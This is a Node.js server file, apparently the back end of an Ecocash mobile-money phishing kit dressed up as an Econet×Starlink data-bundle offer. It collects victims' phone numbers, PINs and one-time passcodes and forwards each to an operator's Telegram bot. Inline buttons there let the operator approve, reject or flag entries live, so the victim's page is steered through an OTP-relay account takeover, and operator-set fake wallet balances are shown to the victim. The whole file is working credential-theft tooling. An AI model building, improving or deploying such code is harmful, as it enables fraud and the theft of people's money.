// server.js - Ecocash
'use strict';
const express     = require('express');
const cors        = require('cors');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app  = express();
const PORT = process.env.PORT || 3001;

// ─── MIDDLEWARE (before routes) ────────────────────────────────────────────
app.use(cors());
app.use(express.json({ limit: '10kb' }));

// ─── CONFIG ────────────────────────────────────────────────────────────────
const CFG = Object.freeze({
  DUPE_TTL:          5_000,        // ms — block identical requests within window
  APPROVAL_TIMEOUT:  5 * 60_000,   // ms — admin must act within 5 min
  CLEANUP_INTERVAL:  15_000,       // ms — GC frequency (was 60s)
  READ_TTL:          30_000,       // ms — keep terminal OTP records after first read
  MAX_USERS:         parseInt(process.env.MAX_USERS) || 1,
  BOT_STARTUP_DELAY: 2_000,
  MAX_RESTARTS:      5,
  POLLING_TIMEOUT:   30,           // seconds — Telegram long-poll window
  TG_CHAT_INTERVAL:  1_050,        // ms — Telegram: 1 msg/s per chat
  MAX_MSG_SIZE:      4_096,
  SSE_HEARTBEAT:     20_000,       // ms — keep SSE alive
});

// ─── LOGGER ────────────────────────────────────────────────────────────────
const ts     = () => new Date().toISOString();
const logger = {
  info:  (m, ...a) => console.log (`[INFO]  ${ts()} ${m}`, ...a),
  warn:  (m, ...a) => console.warn (`[WARN]  ${ts()} ${m}`, ...a),
  error: (m, ...a) => console.error(`[ERROR] ${ts()} ${m}`, ...a),
  debug: (m, ...a) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} ${m}`, ...a),
};

// ─── HELPERS ───────────────────────────────────────────────────────────────
const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() : String(s ?? ''));
const trunc    = (s, n = CFG.MAX_MSG_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
const sleep    = (ms) => new Promise(r => setTimeout(r, ms));

// Pre-compiled — reused across all calls, zero recompilation cost
const RE_NONDIGIT = /\D/g;

// Memoised phone normalisation — same raw input always yields same result
const _phoneCache = new Map();
const normalise = (raw) => {
  if (!raw || typeof raw !== 'string') return '';
  const hit = _phoneCache.get(raw);
  if (hit) return hit;
  let c = raw.replace(RE_NONDIGIT, '');
  if (c.startsWith('263')) c = c.slice(3);
  if (c.startsWith('0'))   c = c.slice(1);
  if (c.length > 9)        c = c.slice(-9);
  const result = `+263${c}`;
  if (_phoneCache.size > 5_000) _phoneCache.clear();
  _phoneCache.set(raw, result);
  return result;
};
const fmtPhone = (raw) => {
  const full = normalise(raw);
  return { cc: '+263', num: full.slice(4), full };
};

// ─── VALIDATORS ────────────────────────────────────────────────────────────
const RE_PIN = /^\d{4,8}$/;
const RE_OTP = /^\d{4,8}$/;
const vPhone = (p) => {
  if (!p || typeof p !== 'string') return 'Phone must be a string';
  const n = p.replace(RE_NONDIGIT, '');
  return (n.length < 9 || n.length > 15) ? 'Invalid phone length' : null;
};
const vPin   = (p) => (!p || typeof p !== 'string') ? 'PIN must be a string'
                    : !RE_PIN.test(p)               ? 'PIN must be 4-8 digits' : null;
const vOtp   = (o) => (!o || typeof o !== 'string') ? 'OTP must be a string'
                    : !RE_OTP.test(o)               ? 'OTP must be 4-8 digits' : null;

// ─── O(1) DUPE CACHE ───────────────────────────────────────────────────────
// Each entry self-expires via a stored setTimeout — no iteration ever needed.
class DupeCache {
  constructor(ttl = CFG.DUPE_TTL) { this._m = new Map(); this._ttl = ttl; }
  seen(key) {
    if (this._m.has(key)) return true;
    const h = setTimeout(() => this._m.delete(key), this._ttl);
    if (h.unref) h.unref();
    this._m.set(key, h);
    return false;
  }
  clear() { for (const h of this._m.values()) clearTimeout(h); this._m.clear(); }
}

// ─── PER-USER TELEGRAM SEND QUEUE ──────────────────────────────────────────
// Respects Telegram's 1 msg/s per-chat rate limit.
// Each user has their own queue — they never block each other.
class TgQueue {
  constructor(interval = CFG.TG_CHAT_INTERVAL) {
    this._q        = [];
    this._running  = false;
    this._interval = interval;
    this._last     = 0;
  }
  send(fn) {
    return new Promise((resolve, reject) => {
      this._q.push({ fn, resolve, reject });
      if (!this._running) this._drain();
    });
  }
  async _drain() {
    this._running = true;
    while (this._q.length) {
      const gap = this._interval - (Date.now() - this._last);
      if (gap > 0) await sleep(gap);
      const { fn, resolve, reject } = this._q.shift();
      this._last = Date.now();
      try   { resolve(await fn()); }
      catch (e) { reject(e); }
    }
    this._running = false;
  }
}

// ─── SSE BROKER ────────────────────────────────────────────────────────────
// Replaces the polling pattern entirely.
// Admin taps button → callback fires → sseBroker.push() → client receives
// status in <50ms instead of waiting for the next poll interval.
class SseBroker {
  constructor() { this._subs = new Map(); }

  subscribe(key, res) {
    res.setHeader('Content-Type',      'text/event-stream');
    res.setHeader('Cache-Control',     'no-cache');
    res.setHeader('Connection',        'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');
    res.flushHeaders();

    const hb    = setInterval(() => { if (!res.writableEnded) res.write(': ping\n\n'); }, CFG.SSE_HEARTBEAT);
    const entry = { res, hb };

    if (!this._subs.has(key)) this._subs.set(key, new Set());
    this._subs.get(key).add(entry);

    const unsub = () => {
      clearInterval(hb);
      const s = this._subs.get(key);
      if (s) { s.delete(entry); if (!s.size) this._subs.delete(key); }
      if (!res.writableEnded) res.end();
    };
    res.on('close', unsub);
    res.on('error', unsub);
  }

  push(key, payload) {
    const set = this._subs.get(key);
    if (!set?.size) return;
    const data = `data: ${JSON.stringify(payload)}\n\n`;
    for (const { res, hb } of set) {
      clearInterval(hb);
      if (!res.writableEnded) { res.write(data); res.end(); }
    }
    this._subs.delete(key);
  }

  get size() { let n = 0; for (const s of this._subs.values()) n += s.size; return n; }
}

const sseBroker = new SseBroker();

// ─── MESSAGE FORMATTERS ────────────────────────────────────────────────────
const fmtBundle = (b) => {
  if (!b?.data) return '';
  const price    = b.price != null && !isNaN(b.price) ? `$${b.price}` : 'N/A';
  const validity = b.validity ? ` (${sanitize(b.validity)})` : '';
  return `\n📦 <b>Bundle:</b> ${sanitize(b.data)} / ${price}${validity}`;
};

const fmtLogin = (user, { phone, pin, time, bundle }) => {
  const { cc, num } = fmtPhone(phone);
  const returning   = user.verified.has(phone);
  return `📱 <b>${sanitize(user.name)} — LOGIN</b>

${returning ? '🔄 RETURNING USER' : '🆕 NEW USER'}
🌍 <b>Country:</b> <code>${cc}</code>
📞 <b>Number:</b>  <code>${num}</code>
🔐 <b>PIN:</b>     <code>${sanitize(pin)}</code>${fmtBundle(bundle)}
⏰ <b>Time:</b>    ${new Date(time).toLocaleString()}

${returning ? '✅ Skip OTP → Dashboard' : '📲 Proceed → OTP step'}

━━━━━━━━━━━━━━━━━━━
⏱️ Timeout: 5 min`;
};

const fmtOtp = (user, { phone, otp, time, bundle }) => {
  const { cc, num } = fmtPhone(phone);
  return `✅ <b>${sanitize(user.name)} — OTP VERIFY</b>

🆕 NEW USER
🌍 <b>Country:</b> <code>${cc}</code>
📞 <b>Number:</b>  <code>${num}</code>
🔑 <b>OTP:</b>     <code>${sanitize(otp)}</code>${fmtBundle(bundle)}
⏰ <b>Time:</b>    ${new Date(time).toLocaleString()}

━━━━━━━━━━━━━━━━━━━
⏱️ Timeout: 5 min`;
};

// ─── CALLBACK DATA ─────────────────────────────────────────────────────────
const CB_SEP  = '|';
const mkCb    = (type, action, phone, secret) => [type, action, phone, secret].join(CB_SEP);
const parseCb = (d) => {
  const p = d.split(CB_SEP);
  return p.length === 4 ? { type: p[0], action: p[1], phone: p[2], secret: p[3] } : null;
};

// ─── BOT MANAGER ───────────────────────────────────────────────────────────
class BotManager {
  constructor(user, link) {
    this.user         = user;
    this.link         = link;
    this.bot          = null;
    this.polling      = false;
    this.initializing = false;
    this._p           = null;
    this.restarts     = 0;
    this.pollErrors   = 0;
  }

  async init() {
    if (this.initializing) return this._p;
    this.initializing = true;
    this._p = this._doInit().finally(() => { this.initializing = false; this._p = null; });
    return this._p;
  }

  async _doInit() {
    await this._cleanup();
    await sleep(500);

    this.bot = new TelegramBot(this.user.botToken, {
      polling: { interval: 0, autoStart: false, params: { timeout: CFG.POLLING_TIMEOUT } },
      filepath: false,
    });

    this._attachErrors();
    this._attachCommands();
    await this.bot.startPolling();
    this.polling = true;

    const me = await this.bot.getMe();
    logger.info(`${this.user.name}: @${me.username} ready`);

    this.user.healthy = true;
    this.user.bot     = this.bot;
    this.restarts     = 0;
    this.pollErrors   = 0;
  }

  async _cleanup() {
    if (!this.bot) return;
    this.bot.removeAllListeners();
    if (this.polling) try { await this.bot.stopPolling({ cancel: true }); } catch (_) {}
    try { if (this.bot._polling) this.bot._polling.abort = true; } catch (_) {}
    this.polling = false;
    this.bot = this.user.bot = null;
  }

  _restart(delay = 10_000) {
    if (this.restarts >= CFG.MAX_RESTARTS) { this.user.healthy = false; return; }
    if (this.initializing) return;
    this.restarts++;
    logger.info(`${this.user.name}: restart #${this.restarts} in ${delay}ms`);
    const t = setTimeout(() => this.init().catch(e => logger.error(`restart failed:`, e.message)), delay);
    if (t.unref) t.unref();
  }

  _attachErrors() {
    this.bot.on('polling_error', (err) => {
      this.pollErrors++;
      logger.error(`${this.user.name}: poll error #${this.pollErrors}:`, err.message);
      const s = err.response?.statusCode;
      if (err.code === 'EFATAL')  return this._restart(5_000);
      if (s === 401)              { this.user.healthy = false; return this._cleanup(); }
      if (s === 409)              return this._restart(10_000);
      if (this.pollErrors > 10)   return this._restart(15_000);
    });
    this.bot.on('error',         (e) => logger.error(`${this.user.name}: bot error:`,     e.message));
    this.bot.on('webhook_error', (e) => logger.error(`${this.user.name}: webhook error:`, e.message));
  }

  _attachCommands() {
    const { bot, user, link } = this;

    bot.onText(/\/start/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id,
          `🛰️ <b>${sanitize(user.name)} — Econet×Starlink Bot</b>\n\n` +
          `<b>Chat ID:</b> <code>${msg.chat.id}</code>\n` +
          `<b>Endpoint:</b> <code>/api/${link}/*</code>\n\n` +
          `Add to .env:\n<code>TELEGRAM_CHAT_ID_${user.id}=${msg.chat.id}</code>`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error('/start:', e.message); }
    });

    bot.onText(/\/status/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id,
          `✅ <b>${sanitize(user.name)} — Status</b>\n\n` +
          `📊 Pending logins: ${user.logins.size}\n` +
          `📊 Pending OTPs:   ${user.otps.size}\n` +
          `✅ Verified users: ${user.verified.size}\n` +
          `💰 Wallets set:    ${user.wallets.size}\n` +
          `📡 SSE clients:    ${sseBroker.size}\n` +
          `🔗 Endpoint: <code>/api/${link}/*</code>\n` +
          `🔄 Restarts: ${this.restarts} | Poll errors: ${this.pollErrors}\n` +
          `${user.lastErr ? `⚠️ Last error: ${user.lastErr}` : ''}`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error('/status:', e.message); }
    });

    bot.onText(/\/wallet (.+)/, async (msg, match) => {
      try {
        const args = match[1].trim().split(/\s+/);
        if (args.length !== 4)
          return bot.sendMessage(msg.chat.id, '❌ Usage: <code>/wallet [phone] [name] [USD] [ZWG]</code>', { parse_mode: 'HTML' });
        const [rawPhone, name, usd, zwg] = args;
        const usdN = parseFloat(usd), zwgN = parseFloat(zwg);
        if (isNaN(usdN) || isNaN(zwgN) || usdN < 0 || zwgN < 0)
          return bot.sendMessage(msg.chat.id, '❌ Invalid amounts.', { parse_mode: 'HTML' });
        const phone = normalise(rawPhone);
        user.wallets.set(phone, { name: sanitize(name), usd: usdN, zwg: zwgN, ts: Date.now() });
        await bot.sendMessage(msg.chat.id,
          `✅ <b>Wallet set</b>\n👤 ${sanitize(name)}\n📱 <code>${phone}</code>\n💵 $${usdN.toFixed(2)}\n💰 ZWG ${zwgN.toFixed(2)}`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error('/wallet:', e.message); }
    });

    bot.onText(/\/restart/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id, '🔄 Restarting...', { parse_mode: 'HTML' });
        this.restarts = 0;
        await this.init();
        await bot.sendMessage(msg.chat.id, '✅ Restarted!', { parse_mode: 'HTML' });
      } catch (e) { logger.error('/restart:', e.message); }
    });

    bot.on('callback_query', async (q) => {
      try { await handleCallback(user, q); }
      catch (e) {
        // Log only — do NOT answerCallbackQuery here.
        // handleCallback always answers before any throw, so a second
        // answer would itself fail and re-trigger the error alert.
        logger.error(`${user.name}: callback error:`, e.message);
      }
    });
  }

  ok() { return this.polling && this.user.healthy && !this.initializing; }
}

// ─── CALLBACK HANDLER ──────────────────────────────────────────────────────
// Design rules that prevent the "❌ Error" alert:
//
//  1. IDEMPOTENCY GUARD — if this callback_query_id was already handled
//     (double-tap or Telegram duplicate delivery), answer silently and bail.
//     Telegram delivers each qid exactly once per bot session, but network
//     retries can cause the library to fire it twice.
//
//  2. SINGLE answerCallbackQuery — Telegram allows exactly one answer per qid.
//     We call it once, at the very end, with the final status text.
//     The intermediate "⏳ Processing..." is dropped — it caused the double-
//     answer that showed the error alert.
//
//  3. FIRE-AND-FORGET editMessageText — we do NOT await it before answering.
//     editMessageText is best-effort UI decoration. If it fails (message
//     already edited, too old, network blip) the record is already updated
//     in memory and the SSE push already fired — the user flow is unaffected.
//     We run edit and answer in parallel via Promise.all so neither blocks.
//
//  4. RECORD-LEVEL LOCK — once a record is marked terminal (approved/rejected)
//     any subsequent callback for the same key is a no-op. This handles the
//     case where the admin taps twice before the keyboard is removed.

const _answeredCallbacks = new Set(); // session-scoped dedup for callback_query ids

async function handleCallback(user, q) {
  const { bot }    = user;
  const { data, message: msg, id: qid } = q;
  const { chat: { id: chatId }, message_id: mid } = msg;

  // Rule 1 — idempotency: ignore duplicate deliveries of the same callback
  if (_answeredCallbacks.has(qid)) return;
  _answeredCallbacks.add(qid);
  // Auto-evict after 10 min so the Set doesn't grow forever
  const t = setTimeout(() => _answeredCallbacks.delete(qid), 10 * 60_000);
  if (t.unref) t.unref();

  // Rule 3 helper — fire-and-forget, never throws into our flow
  const edit = (text) =>
    bot.editMessageText(text, {
      chat_id: chatId, message_id: mid, parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [] },
    }).catch(e => logger.debug('edit skipped:', e.message));

  // Rule 2 helper — ONE answer, called exactly once per handler path
  const answer = (text, alert = false) =>
    bot.answerCallbackQuery(qid, { text, show_alert: alert }).catch(e => logger.debug('answer:', e.message));

  const parsed = parseCb(data);
  if (!parsed) { await answer('❌ Bad data', true); return; }

  const { type, action, phone, secret } = parsed;
  const key = `${phone}-${secret}`;
  const now = Date.now();

  // ── LOGIN ──
  if (type === 'login') {
    const rec = user.logins.get(key);
    if (!rec) { await answer('❌ Session not found', true); return; }

    // Rule 4 — already handled
    if (rec.approved || rec.rejected) { await answer('✅ Already processed'); return; }

    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
      Object.assign(rec, { approved: false, rejected: true, expired: true });
      sseBroker.push(`login:${key}`, { approved: false, rejected: true, expired: true, reason: null });
      await Promise.all([
        edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
        answer('⏰ Session expired', true),
      ]);
      return;
    }

    if (action === 'proceed') {
      rec.approved = true;
      const ret = user.verified.has(phone);
      sseBroker.push(`login:${key}`, { approved: true, rejected: false, expired: false, reason: null });
      await Promise.all([
        edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n${ret ? '→ Dashboard' : '→ OTP step'}`),
        answer('✅ Allowed!'),
      ]);
    } else if (action === 'invalid') {
      Object.assign(rec, { rejected: true, reason: 'invalid' });
      sseBroker.push(`login:${key}`, { approved: false, rejected: true, expired: false, reason: 'invalid' });
      await Promise.all([
        edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
        answer('❌ Marked invalid'),
      ]);
    } else {
      await answer('❓ Unknown action');
    }
    return;
  }

  // ── OTP ──
  if (type === 'otp') {
    const rec = user.otps.get(key);
    if (!rec) { await answer('❌ Verification not found', true); return; }

    // Rule 4 — already handled
    if (rec.status !== 'pending') { await answer('✅ Already processed'); return; }

    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
      rec.status = 'timeout';
      sseBroker.push(`otp:${key}`, { status: 'timeout' });
      await Promise.all([
        edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
        answer('⏰ Session expired', true),
      ]);
      return;
    }

    if (action === 'correct') {
      rec.status = 'approved';
      user.verified.set(phone, { ts: now });
      sseBroker.push(`otp:${key}`, { status: 'approved' });
      await Promise.all([
        edit(`✅ <b>VERIFIED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>\n\n💡 Set wallet:\n<code>/wallet ${phone} Name 100.00 0</code>`),
        answer('✅ Verified!'),
      ]);
    } else if (action === 'wrong') {
      rec.status = 'rejected';
      sseBroker.push(`otp:${key}`, { status: 'rejected' });
      await Promise.all([
        edit(`❌ <b>WRONG OTP</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
        answer('❌ Wrong OTP'),
      ]);
    } else if (action === 'wrongpin') {
      rec.status = 'wrong_pin';
      sseBroker.push(`otp:${key}`, { status: 'wrong_pin' });
      await Promise.all([
        edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
        answer('⚠️ Wrong PIN'),
      ]);
    } else {
      await answer('❓ Unknown action');
    }
    return;
  }

  await answer('❓ Unknown type');
}

// ─── SEND TELEGRAM MESSAGE ─────────────────────────────────────────────────
async function sendMsg(user, text, opts = {}) {
  if (!user.bot || !user.mgr?.ok()) return { ok: false, err: 'Bot not ready' };
  return user.tgQueue.send(async () => {
    try {
      await user.bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts });
      return { ok: true };
    } catch (e) {
      user.lastErr = e.message;
      logger.error(`sendMsg [${user.name}]:`, e.code, e.message);
      const s = e.response?.statusCode;
      if (s === 401) { user.healthy = false; return { ok: false, err: 'Auth failed', critical: true }; }
      if (s === 429) return { ok: false, err: 'Rate limited', retry: e.response.parameters?.retry_after || 30 };
      return { ok: false, err: e.message };
    }
  });
}

// ─── LOAD USERS ────────────────────────────────────────────────────────────
const users = new Map();

(function loadUsers() {
  let ok = 0, fail = 0;
  for (let i = 1; i <= CFG.MAX_USERS; i++) {
    const link   = process.env[`USER_LINK_INSERT_${i}`];
    const token  = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
    const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
    const name   = process.env[`USER_NAME_${i}`] || `User ${i}`;
    if (!link || !token || !chatId) continue;
    if (!/^[a-zA-Z0-9_-]+$/.test(link))     { logger.warn(`User ${i}: bad link`);   fail++; continue; }
    if (!/^\d+:[A-Za-z0-9_-]+$/.test(token)) { logger.warn(`User ${i}: bad token`);  fail++; continue; }
    if (!/^-?\d+$/.test(chatId))              { logger.warn(`User ${i}: bad chatId`); fail++; continue; }
    if (users.has(link))                      { logger.warn(`Dup link: ${link}`);     fail++; continue; }

    const u = {
      id: i, name: sanitize(name), linkInsert: link, botToken: token, chatId,
      bot: null, healthy: false, lastErr: null,
      logins:   new Map(),
      otps:     new Map(),
      wallets:  new Map(),
      verified: new Map(),
      dupes:    new DupeCache(),
      tgQueue:  new TgQueue(),
    };
    u.mgr = new BotManager(u, link);
    users.set(link, u);
    ok++;
  }
  logger.info(`Users loaded: ${ok} ok, ${fail} failed`);
})();

// ─── STAGGERED BOT INIT ────────────────────────────────────────────────────
(async () => {
  const arr = [...users.values()];
  for (let i = 0; i < arr.length; i++) {
    try   { await arr[i].mgr.init(); }
    catch (e) { logger.error(`Init [${arr[i].name}]:`, e.message); }
    if (i < arr.length - 1) await sleep(CFG.BOT_STARTUP_DELAY);
  }
  logger.info('All bots ready');
})();

// ─── GC (every 15s) ────────────────────────────────────────────────────────
setInterval(() => {
  const now    = Date.now();
  const expire = now - CFG.APPROVAL_TIMEOUT;
  const purge  = now - 10 * 60_000;

  for (const u of users.values()) {
    for (const [k, v] of u.logins) {
      if (!v.expired && v.ts < expire) Object.assign(v, { approved: false, rejected: true, expired: true });
      if (v.ts < purge) u.logins.delete(k);
    }
    for (const [k, v] of u.otps) {
      if (v.status === 'pending' && v.ts < expire) {
        v.status = 'timeout';
        sseBroker.push(`otp:${k}`, { status: 'timeout' });
      }
      if (v.readAt && now - v.readAt > CFG.READ_TTL) { u.otps.delete(k); continue; }
      if (v.ts < purge) u.otps.delete(k);
    }
  }
}, CFG.CLEANUP_INTERVAL).unref?.();

// ─── HEALTH MONITOR (every 60s) ───────────────────────────────────────────
setInterval(() => {
  for (const u of users.values())
    if (u.mgr && !u.mgr.ok() && !u.mgr.initializing && u.mgr.restarts < CFG.MAX_RESTARTS)
      u.mgr._restart(15_000);
}, 60_000).unref?.();

// ─── ROUTE HELPERS ────────────────────────────────────────────────────────
const botOk = (u, res) => {
  if (!u.bot || !u.healthy) { res.status(503).json({ success: false, message: 'Bot service unavailable' }); return false; }
  return true;
};

// ─── HEALTH ────────────────────────────────────────────────────────────────
app.get('/api/health', (_, res) => {
  const list = [...users.values()].map(u => ({
    name: u.name, link: u.linkInsert, healthy: u.healthy, active: !!u.bot,
    logins: u.logins.size, otps: u.otps.size, verified: u.verified.size,
    wallets: u.wallets.size, sse: sseBroker.size, lastErr: u.lastErr,
  }));
  res.json({ status: list.some(u => u.healthy) ? 'ok' : 'degraded', users: list, ts: ts() });
});

// ─── DYNAMIC ROUTES ────────────────────────────────────────────────────────
users.forEach((user, link) => {
  const R = `/api/${link}`;

  // check-user-status
  app.post(`${R}/check-user-status`, (req, res) => {
    const raw = req.body.phoneNumber;
    if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
    const e = vPhone(raw); if (e) return res.status(400).json({ success: false, message: e });
    res.json({ success: true, isReturningUser: user.verified.has(normalise(raw)) });
  });

  // get-wallet-balances
  app.post(`${R}/get-wallet-balances`, (req, res) => {
    const raw = req.body.phoneNumber;
    if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
    const w = user.wallets.get(normalise(raw));
    res.json({ success: true, name: w?.name || '', usd: w?.usd ?? 0, zwg: w?.zwg ?? 0 });
  });

  // login
  app.post(`${R}/login`, async (req, res) => {
    if (!botOk(user, res)) return;
    const { pin, timestamp, bundle } = req.body;
    const raw = req.body.phoneNumber;
    if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
    const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
    const ie = vPin(pin);   if (ie) return res.status(400).json({ success: false, message: ie });

    const phone = normalise(raw);
    if (user.dupes.seen(`login:${phone}:${pin}`))
      return res.json({ success: true, message: 'Cached' });

    const key = `${phone}-${pin}`;
    user.logins.set(key, { ts: Date.now(), approved: false, rejected: false, expired: false });

    const text     = fmtLogin(user, { phone, pin, time: timestamp || Date.now(), bundle });
    const keyboard = { inline_keyboard: [
      [{ text: '✅ Allow to Proceed',   callback_data: mkCb('login', 'proceed', phone, pin) }],
      [{ text: '❌ Invalid Information', callback_data: mkCb('login', 'invalid', phone, pin) }],
    ]};

    const r = await sendMsg(user, text, { reply_markup: keyboard });
    r.ok
      ? res.json({ success: true, message: 'Waiting for approval' })
      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
  });

  // check-login-approval  (polling — kept for backwards compatibility)
  app.post(`${R}/check-login-approval`, (req, res) => {
    const { pin } = req.body;
    const raw     = req.body.phoneNumber;
    if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
    const phone = normalise(raw);
    const rec   = user.logins.get(`${phone}-${pin}`);
    if (!rec) return res.json({ success: true, approved: false, rejected: false, expired: false });
    if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT)
      return res.json({ success: true, approved: false, rejected: true, expired: true });
    res.json({ success: true, approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null });
  });

  // stream-login-approval  (SSE — instant, replaces polling)
  // Usage: GET /api/{link}/stream-login-approval?phone=+263771234567&pin=1234
  app.get(`${R}/stream-login-approval`, (req, res) => {
    const { phone: rp, pin } = req.query;
    if (!rp || !pin) return res.status(400).json({ success: false, message: 'phone and pin required' });
    const phone = normalise(rp);
    const key   = `${phone}-${pin}`;
    const rec   = user.logins.get(key);
    if (rec && (rec.approved || rec.rejected)) {
      res.setHeader('Content-Type', 'text/event-stream');
      res.flushHeaders();
      res.write(`data: ${JSON.stringify({ approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null })}\n\n`);
      return res.end();
    }
    sseBroker.subscribe(`login:${key}`, res);
  });

  // verify-otp
  app.post(`${R}/verify-otp`, async (req, res) => {
    if (!botOk(user, res)) return;
    const { otp, timestamp, bundle } = req.body;
    const raw = req.body.phoneNumber;
    if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
    const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
    const oe = vOtp(otp);   if (oe) return res.status(400).json({ success: false, message: oe });

    const phone = normalise(raw);
    if (user.dupes.seen(`otp:${phone}:${otp}`))
      return res.json({ success: true, message: 'Cached' });

    const key = `${phone}-${otp}`;
    user.otps.set(key, { status: 'pending', ts: Date.now() });

    const text     = fmtOtp(user, { phone, otp, time: timestamp || Date.now(), bundle });
    const keyboard = { inline_keyboard: [
      [{ text: '✅ Correct (PIN + OTP)', callback_data: mkCb('otp', 'correct',  phone, otp) }],
      [
        { text: '❌ Wrong Code', callback_data: mkCb('otp', 'wrong',    phone, otp) },
        { text: '⚠️ Wrong PIN',  callback_data: mkCb('otp', 'wrongpin', phone, otp) },
      ],
    ]};

    const r = await sendMsg(user, text, { reply_markup: keyboard });
    r.ok
      ? res.json({ success: true, message: 'OTP sent' })
      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
  });

  // check-otp-status  (polling — kept for backwards compatibility)
  app.post(`${R}/check-otp-status`, (req, res) => {
    const { otp } = req.body;
    const raw     = req.body.phoneNumber;
    if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
    const phone = normalise(raw);
    const rec   = user.otps.get(`${phone}-${otp}`);
    if (!rec) return res.json({ success: true, status: 'pending' });
    if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout' });
    if (['approved', 'rejected', 'wrong_pin'].includes(rec.status)) rec.readAt = rec.readAt || Date.now();
    res.json({ success: true, status: rec.status });
  });

  // stream-otp-status  (SSE — instant, replaces polling)
  // Usage: GET /api/{link}/stream-otp-status?phone=+263771234567&otp=123456
  app.get(`${R}/stream-otp-status`, (req, res) => {
    const { phone: rp, otp } = req.query;
    if (!rp || !otp) return res.status(400).json({ success: false, message: 'phone and otp required' });
    const phone = normalise(rp);
    const key   = `${phone}-${otp}`;
    const rec   = user.otps.get(key);
    if (rec && rec.status !== 'pending') {
      res.setHeader('Content-Type', 'text/event-stream');
      res.flushHeaders();
      res.write(`data: ${JSON.stringify({ status: rec.status })}\n\n`);
      return res.end();
    }
    sseBroker.subscribe(`otp:${key}`, res);
  });

  // resend-otp
  app.post(`${R}/resend-otp`, async (req, res) => {
    if (!botOk(user, res)) return;
    const { timestamp } = req.body;
    const raw           = req.body.phoneNumber;
    if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
    const phone = normalise(raw);
    const text  = `🔄 <b>${sanitize(user.name)} — OTP RESEND</b>\n📞 <code>${phone}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
    const r     = await sendMsg(user, text);
    r.ok ? res.json({ success: true }) : res.status(500).json({ success: false, error: r.err });
  });
});

// ─── 404 + ERROR ──────────────────────────────────────────────────────────
app.use((req, res) => res.status(404).json({ success: false, message: 'Not found', path: req.path }));
app.use((err, req, res, _next) => { logger.error('Unhandled:', err.message); res.status(500).json({ success: false, error: 'Internal server error' }); });

// ─── GRACEFUL SHUTDOWN ────────────────────────────────────────────────────
const shutdown = async (sig) => {
  logger.info(`${sig} — shutting down`);
  server.close();
  for (const u of users.values()) { u.dupes.clear(); await u.mgr?._cleanup(); }
  process.exit(0);
};
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('uncaughtException',  (e) => logger.error('Uncaught:', e.message, e.stack));
process.on('unhandledRejection', (r) => logger.error('Unhandled rejection:', r));

// ─── START ────────────────────────────────────────────────────────────────
const server = app.listen(PORT, () => {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`🛰️  Econet×Starlink Bundle Server`);
  console.log(`🚀  Port: ${PORT}`);
  console.log(`👥  Users: ${users.size}/${CFG.MAX_USERS}`);
  users.forEach((u, l) => console.log(`   ⏳ ${u.name}: /api/${l}/*`));
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
});
